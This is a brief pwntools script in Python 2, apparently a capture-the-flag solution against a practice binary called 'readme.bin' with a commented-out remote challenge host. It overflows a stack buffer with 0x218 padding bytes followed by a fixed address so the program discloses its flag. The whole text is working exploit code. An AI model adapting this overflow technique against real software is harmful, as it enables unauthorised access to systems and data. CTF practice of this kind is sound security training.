#! /usr/bin/python

from pwn import *

p = process('./readme.bin')
#p = remote('pwn.jarvisoj.com', 9877)

offset = 0x218
flag = 0x400D20

payload = 'A' * offset + p64(flag)
p.recvuntil('your name? ')
p.sendline(payload)
p.recvuntil('Please overwrite the flag: ')
p.sendline('bb')


print p.recv()
p.interactive()
